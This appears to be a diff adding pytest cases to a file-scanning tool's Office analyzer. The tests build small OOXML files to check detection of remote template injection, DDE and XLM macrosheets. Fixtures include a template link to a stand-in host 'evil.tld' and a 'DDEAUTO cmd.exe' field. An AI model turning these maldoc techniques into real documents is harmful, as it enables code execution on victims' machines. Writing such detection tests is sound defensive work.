@@ -255,3 +255,54 @@ def test_pe_header_anomalies_on_mutated_binary(tmp_path):
     clean_titles = [t.title for t in PEAnalyzer().analyze(cln)]
     assert not any("Zeroed compile timestamp" in t for t in clean_titles)
     assert not any("Future/forged compile timestamp" in t for t in clean_titles)
+
+
+def _ooxml(tmp_path, name, parts):
+    import zipfile
+    f = tmp_path / name
+    with zipfile.ZipFile(f, "w") as z:
+        for n, c in parts.items():
+            z.writestr(n, c)
+    return f
+
+
+def test_office_remote_template_injection(tmp_path):
+    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
+            'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+            'relationships/attachedTemplate" Target="http://evil.tld/t.dotm" '
+            'TargetMode="External"/></Relationships>')
+    f = _ooxml(tmp_path, "a.docx", {"[Content_Types].xml": "<Types/>",
+                                    "word/document.xml": "<w:document/>",
+                                    "word/_rels/settings.xml.rels": rels})
+    ctx = _ctx(tmp_path, "a.docx", f.read_bytes())
+    titles = [t.title for t in OfficeAnalyzer().analyze(ctx)]
+    assert any("Remote template injection" in t for t in titles)
+
+
+def test_office_dde_and_xlm(tmp_path):
+    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    dde = _ooxml(tmp_path, "b.docx", {
+        "[Content_Types].xml": "<Types/>",
+        "word/document.xml": "<w:document><w:instrText>DDEAUTO cmd.exe"
+                             "</w:instrText></w:document>"})
+    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "b.docx", dde.read_bytes()))]
+    assert any("DDE" in t for t in titles)
+
+    xlm = _ooxml(tmp_path, "c.xlsx", {"[Content_Types].xml": "<Types/>",
+                                      "xl/macrosheets/sheet1.xml": "<x/>"})
+    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "c.xlsx", xlm.read_bytes()))]
+    assert any("XLM" in t for t in titles)
+
+
+def test_office_clean_hyperlink_no_fp(tmp_path):
+    from hawkscan.analyzers.office_analyzer import OfficeAnalyzer
+    rels = ('<Relationships xmlns="x"><Relationship Id="r1" '
+            'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+            'relationships/hyperlink" Target="https://example.com" '
+            'TargetMode="External"/></Relationships>')
+    f = _ooxml(tmp_path, "d.docx", {"[Content_Types].xml": "<Types/>",
+                                    "word/document.xml": "<w:document/>",
+                                    "word/_rels/document.xml.rels": rels})
+    titles = [t.title for t in OfficeAnalyzer().analyze(_ctx(tmp_path, "d.docx", f.read_bytes()))]
+    assert not any("template injection" in t.lower() or "External" in t for t in titles)
